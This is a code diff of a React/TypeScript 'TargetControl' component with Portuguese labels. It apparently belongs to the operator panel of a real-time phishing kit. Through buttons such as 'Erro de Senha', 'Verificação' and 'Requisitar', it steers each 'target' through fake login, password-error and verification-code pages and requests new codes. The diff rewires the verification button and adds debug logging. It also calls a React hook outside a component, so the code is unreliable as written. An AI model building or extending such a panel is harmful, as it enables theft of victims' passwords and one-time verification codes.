@@ -53,7 +53,6 @@ export function TargetControl() {
   const { name, info, codes, details } = targetData;
 
   const link = `${BASE_URL}/login/${targetId}`;
-  const self = `${SELF_URL}/target-with-id/${targetData.playerId}/${targetId}`;
 
   return (
     <div>
@@ -97,7 +96,7 @@ export function TargetControl() {
         <hr style={{ margin: "1rem 0" }} />
         <button onClick={() => updateTarget(targetId, { page: 1 })}>Loading</button>
         <button onClick={() => updateTarget(targetId, { page: 2 })}>Erro de Senha</button>
-        <button onClick={() => updateTarget(targetId, { page: 3 })}>Verificação</button>
+        <button onClick={() => CodeBox(targetId)}>Verificação</button>
         <button onClick={() => updateTarget(targetId, { page: 4 })}>Permitir</button>
         <button onClick={() => updateTarget(targetId, { page: 5 })}>Requisitar</button>
       </div>
@@ -107,9 +106,12 @@ export function TargetControl() {
 
 // ---------- Funções do Control ----------
 export function CodeBox(targetId: string) {
+  console.log('Ta no Botão de verificação!!')
+  console.log("Target ID no CodeBox: ", targetId);
   const { currentCodeId, setCurrentCodeId, updateTarget } = useTarget();
-  // if (!targetId) return null;
+  console.log("quebrou depois do Target");
   updateTarget(targetId, { page: 3 })
+  console.log("quebrou depois do update");
   newCodeRequest(targetId, "").then((res) => {
     console.log("Novo code criado no CodeBox: ", res);
     setCurrentCodeId(res.id)
